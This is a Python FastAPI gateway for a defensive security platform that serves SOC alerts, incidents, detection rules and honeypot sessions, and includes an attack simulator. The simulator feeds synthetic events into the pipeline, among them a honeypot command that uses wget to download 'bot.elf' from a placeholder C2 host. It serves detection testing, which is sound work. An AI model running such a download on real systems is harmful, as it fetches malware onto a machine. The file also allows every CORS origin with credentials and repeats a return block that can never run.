"""
FastAPI gateway for Multi Modal Security.

Provides REST endpoints for querying ingested events, alerts, incidents,
honeypot sessions, attacker behavior clusters, and detection rules, plus
a WebSocket endpoint for live telemetry streaming and an interactive attack simulator.

Run from the project root::

    uvicorn src.api.main:app --reload --port 8000
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Optional

from fastapi import FastAPI, HTTPException, Query, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from opensearchpy import OpenSearch

from src.shared.config import settings
from src.shared.event_schema import Entity, SecurityEvent
from src.soc.detection.rule_loader import RuleLoader
from src.soc.detection.matcher import DetectionEngine
from src.soc.correlation.engine import CorrelationEngine
from src.soc.correlation.incident_model import Incident
from src.soc.scoring.calculator import score_incident
from src.soc.alerting.alert_model import Alert
from src.soc.alerting.manager import AlertManager
from src.honeypot.recorder import SessionRecorder
from src.honeypot.server import DeceptionService
from src.honeypot.normalizer import (
    normalise_artifact_record,
    normalise_command_record,
    normalise_credential_attempt,
    normalise_session_to_event,
)
from src.honeypot.behavior import BehaviorAnalyzer

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global In-Memory Pipeline State
# ---------------------------------------------------------------------------

RULES_DIR = Path(__file__).parent.parent / "soc" / "rules"
rule_loader = RuleLoader(rules_dir=RULES_DIR)
loaded_rules = rule_loader.load_from_directory()
detection_engine = DetectionEngine(rules=loaded_rules)
correlation_engine = CorrelationEngine(correlation_window_seconds=300)
alert_manager = AlertManager(min_score_to_alert=15.0)

session_recorder = SessionRecorder()
deception_service = DeceptionService(recorder=session_recorder)
behavior_analyzer = BehaviorAnalyzer()

# In-memory recent events ring buffer (for dev fallback when OpenSearch is offline)
RECENT_EVENTS_BUFFER: list[SecurityEvent] = []
MAX_BUFFER_SIZE = 500


# ---------------------------------------------------------------------------
# WebSocket connection manager
# ---------------------------------------------------------------------------


class ConnectionManager:
    """Manages active WebSocket connections for live event streaming."""

    def __init__(self) -> None:
        self._connections: list[WebSocket] = []

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        self._connections.append(ws)
        logger.info("WebSocket client connected (%d total)", len(self._connections))

    def disconnect(self, ws: WebSocket) -> None:
        if ws in self._connections:
            self._connections.remove(ws)
        logger.info("WebSocket client disconnected (%d remaining)", len(self._connections))

    async def broadcast(self, message: str) -> None:
        """Send *message* to all connected clients."""
        dead: list[WebSocket] = []
        for ws in self._connections:
            try:
                await ws.send_text(message)
            except Exception:
                dead.append(ws)
        for ws in dead:
            if ws in self._connections:
                self._connections.remove(ws)


manager = ConnectionManager()

# ---------------------------------------------------------------------------
# Central Event Ingestion Helper
# ---------------------------------------------------------------------------


async def ingest_pipeline_event(event: SecurityEvent) -> dict[str, Any]:
    """Pass an event through detection, correlation, scoring, and alerting."""
    # 1. Buffer event in-memory
    RECENT_EVENTS_BUFFER.insert(0, event)
    if len(RECENT_EVENTS_BUFFER) > MAX_BUFFER_SIZE:
        RECENT_EVENTS_BUFFER.pop()

    # 1b. Index into OpenSearch if available
    os_client = _get_os()
    if os_client is not None:
        try:
            os_client.index(
                index=settings.opensearch_events_index,
                id=event.event_id,
                body=event.to_opensearch_doc(),
                refresh=True,
            )
        except Exception as exc:
            logger.debug("OpenSearch indexing skipped: %s", exc)

    # 2. Evaluate detection rules
    matches = detection_engine.evaluate(event)

    # 3. Correlate into an incident
    incident = correlation_engine.process_event(event, rule_matches=matches)

    alert: Optional[Alert] = None
    if incident:
        # 4. Score and alert
        alert = alert_manager.process_incident(incident)

    # 5. Broadcast live message via WebSocket
    payload = {
        "type": "event",
        "event": event.model_dump(mode="json"),
        "rule_matches": [m.model_dump(mode="json") for m in matches],
        "incident_id": incident.incident_id if incident else None,
        "alert": alert.model_dump(mode="json") if alert else None,
        "stats": {
            "active_alerts": alert_manager.alert_count,
            "active_incidents": correlation_engine.active_incident_count,
            "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
            "rules_loaded": len(loaded_rules),
        },
    }
    await manager.broadcast(json.dumps(payload))

    return {
        "event_id": event.event_id,
        "rule_matches": len(matches),
        "incident_id": incident.incident_id if incident else None,
        "alert_id": alert.alert_id if alert else None,
    }


# ---------------------------------------------------------------------------
# Background task: poll Redis Streams and relay to WebSocket clients
# ---------------------------------------------------------------------------

_relay_task: Optional[asyncio.Task] = None


async def _redis_to_websocket_relay() -> None:
    """Read new events from Redis Streams and broadcast to WebSockets if available."""
    try:
        import redis.asyncio as aioredis
        r = aioredis.from_url(settings.redis_url, decode_responses=True)
        last_id = "$"

        logger.info("Redis -> WebSocket relay started")
        while True:
            try:
                results = await r.xread(
                    streams={"events:raw": last_id},
                    count=20,
                    block=2000,
                )
            except Exception:
                await asyncio.sleep(2)
                continue

            if not results:
                continue

            for _stream, messages in results:
                for message_id, fields in messages:
                    last_id = message_id
                    data = fields.get("data", "{}")
                    try:
                        ev = SecurityEvent.from_json(data)
                        await ingest_pipeline_event(ev)
                    except Exception:
                        await manager.broadcast(data)
    except Exception as exc:
        logger.info("Redis not running or unreachable: %s (using in-memory pipeline)", exc)


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Start the Redis relay on startup, cancel it on shutdown."""
    global _relay_task
    _relay_task = asyncio.create_task(_redis_to_websocket_relay())
    yield
    if _relay_task:
        _relay_task.cancel()


# ---------------------------------------------------------------------------
# FastAPI application
# ---------------------------------------------------------------------------

app = FastAPI(
    title="Multi Modal Security — API Gateway",
    version="0.3.0",
    description="Unified API Gateway for SOC, Honeypot, Correlation, and Risk Scoring.",
    lifespan=lifespan,
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def _get_os() -> Optional[OpenSearch]:
    try:
        client = OpenSearch(
            hosts=[settings.opensearch_url],
            use_ssl=False,
            verify_certs=False,
            timeout=2,
        )
        if client.ping():
            return client
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# REST Endpoints — Telemetry & Events
# ---------------------------------------------------------------------------


@app.get("/api/health")
async def health():
    """Liveness check and service status."""
    return {
        "status": "ok",
        "service": "mms-api-gateway",
        "rules_loaded": len(loaded_rules),
        "active_incidents": correlation_engine.active_incident_count,
        "active_alerts": alert_manager.alert_count,
        "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
    }


@app.get("/api/events")
async def get_events(
    size: int = Query(default=50, ge=1, le=500, description="Number of events to return"),
    source: Optional[str] = Query(default=None, description="Filter by source module"),
    severity: Optional[str] = Query(default=None, description="Filter by severity level"),
    event_type: Optional[str] = Query(default=None, description="Filter by event type"),
):
    """Query recent security events (merging OpenSearch & in-memory buffer)."""
    events_out: list[dict[str, Any]] = []
    os_client = _get_os()
    if os_client is not None:
        index = settings.opensearch_events_index
        must_clauses: list[dict] = []
        if source:
            must_clauses.append({"term": {"source": source}})
        if severity:
            must_clauses.append({"term": {"severity": severity}})
        if event_type:
            must_clauses.append({"term": {"event_type": event_type}})

        body = {
            "query": {"bool": {"must": must_clauses}} if must_clauses else {"match_all": {}},
            "sort": [{"timestamp": {"order": "desc"}}],
            "size": size,
        }
        try:
            result = os_client.search(index=index, body=body)
            hits = result.get("hits", {}).get("hits", [])
            events_out = [hit["_source"] for hit in hits]
        except Exception:
            pass

    # In-memory buffer fallback if OpenSearch returned nothing
    if not events_out:
        filtered = RECENT_EVENTS_BUFFER
        if source:
            filtered = [e for e in filtered if e.source == source]
        if severity:
            filtered = [e for e in filtered if e.severity == severity]
        if event_type:
            filtered = [e for e in filtered if e.event_type == event_type]
        events_out = [e.model_dump(mode="json") for e in filtered[:size]]

    return {"total": len(events_out), "count": len(events_out), "events": events_out}


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 2 SOC: Alerts, Incidents, & Rules
# ---------------------------------------------------------------------------


@app.get("/api/alerts")
async def get_alerts(priority: Optional[str] = None):
    """Get deduplicated, scored SOC alerts with full ScoreBreakdown and MITRE tags."""
    alerts = alert_manager.get_all_alerts(sort_by_score=True)
    if priority:
        alerts = [a for a in alerts if a.priority == priority]

    return {
        "total": len(alerts),
        "alerts": [a.model_dump(mode="json") for a in alerts],
        "stats": alert_manager.stats,
    }


@app.get("/api/incidents")
async def get_incidents():
    """Get active correlated security incidents with timelines and linked entities."""
    incidents = correlation_engine.get_active_incidents()
    return {
        "total": len(incidents),
        "incidents": [inc.model_dump(mode="json") for inc in incidents],
    }


@app.get("/api/rules")
async def get_rules():
    """List loaded Sigma detection rules."""
    return {
        "count": len(detection_engine.rules),
        "rules": [r.model_dump(mode="json") for r in detection_engine.rules],
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 3 Honeypot: Sessions & Attacker Profiles
# ---------------------------------------------------------------------------


@app.get("/api/honeypot/sessions")
async def get_honeypot_sessions():
    """Get all active and historical honeypot deceptive sessions."""
    active = session_recorder.get_active_sessions()
    history = session_recorder.get_closed_sessions()
    all_sessions = active + history
    all_sessions.sort(key=lambda s: s.start_time, reverse=True)

    return {
        "active_count": len(active),
        "closed_count": len(history),
        "total": len(all_sessions),
        "sessions": [s.model_dump(mode="json") for s in all_sessions],
    }


@app.get("/api/honeypot/attackers")
async def get_honeypot_attackers():
    """Get attacker profiles and campaign archetype clusters."""
    all_sessions = session_recorder.get_active_sessions() + session_recorder.get_closed_sessions()
    clusters = behavior_analyzer.cluster_attackers(all_sessions)

    # Serialise clusters
    serialized_clusters = {}
    for arch, profiles in clusters.items():
        serialized_clusters[arch] = [p.model_dump(mode="json") for p in profiles]

    return {
        "clusters": serialized_clusters,
        "statistics": behavior_analyzer.generate_statistics(all_sessions),
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Interactive Simulation
# ---------------------------------------------------------------------------


class SimulationRequest(BaseModel):
    scenario: str = "multistage"
    attacker_ip: str = "203.0.113.88"


@app.post("/api/simulate/attack")
async def simulate_attack(req: SimulationRequest):
    """Trigger a realistic multi-stage attack simulation and push into live pipeline."""
    now = datetime.now(timezone.utc)
    attacker_ip = req.attacker_ip
    events_generated = []

    if req.scenario in ("ssh_brute_force", "multistage"):
        # 1. Failed SSH Attempts (triggers SOC-RULE-001 at 5 attempts)
        for i in range(5):
            ev = SecurityEvent(
                timestamp=now - timedelta(seconds=60 - (i * 2)),
                source="soc",
                severity="medium",
                entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
                event_type="auth_failure",
                raw={"service": "sshd", "line": f"Failed password for root from {attacker_ip} attempt {i+1}"},
            )
            res = await ingest_pipeline_event(ev)
            events_generated.append(res)

    if req.scenario in ("sudo_escalation", "multistage"):
        # 2. Successful Login & Sudo Escalation (triggers SOC-RULE-002 and SOC-RULE-005)
        ev_login = SecurityEvent(
            timestamp=now - timedelta(seconds=40),
            source="soc",
            severity="low",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="session_open",
            raw={"service": "sshd", "line": f"session opened for user root from {attacker_ip}"},
        )
        await ingest_pipeline_event(ev_login)

        ev_sudo = SecurityEvent(
            timestamp=now - timedelta(seconds=30),
            source="soc",
            severity="high",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="privilege_escalation",
            raw={"service": "sudo", "command": "/bin/bash", "line": "root : COMMAND=/bin/bash"},
        )
        res_sudo = await ingest_pipeline_event(ev_sudo)
        events_generated.append(res_sudo)

    if req.scenario in ("honeypot_pivot", "multistage"):
        # 3. Honeypot Deceptive Interaction (awards MULTI_SOURCE_BONUS)
        start_ts = now - timedelta(seconds=25)
        session = deception_service.handle_connection(
            source_ip=attacker_ip,
            source_port=52341,
            client_version="SSH-2.0-Paramiko_2.8.0",
        )
        session.start_time = start_ts
        deception_service.handle_auth(session.session_id, "admin", "admin123", allow_login=True)
        deception_service.handle_command(session.session_id, "whoami")
        deception_service.handle_command(session.session_id, "wget http://c2-server.org/bot.elf")
        closed = deception_service.handle_disconnect(session.session_id)

        if closed:
            closed.end_time = now
            closed.duration_seconds = 25.0
            ev_hp_cmd = normalise_command_record(closed, closed.commands[0])
            ev_hp_cmd.timestamp = start_ts + timedelta(seconds=5)
            ev_hp_dl = normalise_artifact_record(closed, closed.artifacts[0])
            ev_hp_dl.timestamp = start_ts + timedelta(seconds=12)
            ev_hp_sess = normalise_session_to_event(closed)
            ev_hp_sess.timestamp = now

            await ingest_pipeline_event(ev_hp_cmd)
            await ingest_pipeline_event(ev_hp_dl)
            res_hp = await ingest_pipeline_event(ev_hp_sess)
            events_generated.append(res_hp)

    # Return summary of resulting pipeline state
    active_alerts = alert_manager.get_all_alerts(sort_by_score=True)
    return {
        "scenario": req.scenario,
        "attacker_ip": attacker_ip,
        "events_ingested": len(events_generated),
        "total_active_alerts": len(active_alerts),
        "top_alert": active_alerts[0].model_dump(mode="json") if active_alerts else None,
    }

    # Return summary of resulting pipeline state
    active_alerts = alert_manager.get_all_alerts(sort_by_score=True)
    return {
        "scenario": req.scenario,
        "attacker_ip": attacker_ip,
        "events_ingested": len(events_generated),
        "total_active_alerts": len(active_alerts),
        "top_alert": active_alerts[0].model_dump(mode="json") if active_alerts else None,
    }


# ---------------------------------------------------------------------------
# WebSocket Endpoint — Live Telemetry & Incident Stream
# ---------------------------------------------------------------------------


@app.websocket("/api/events/live")
async def websocket_events(ws: WebSocket):
    """Stream live telemetry, alerts, and incident updates to the dashboard."""
    await manager.connect(ws)
    try:
        while True:
            # Keep connection open
            await ws.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(ws)
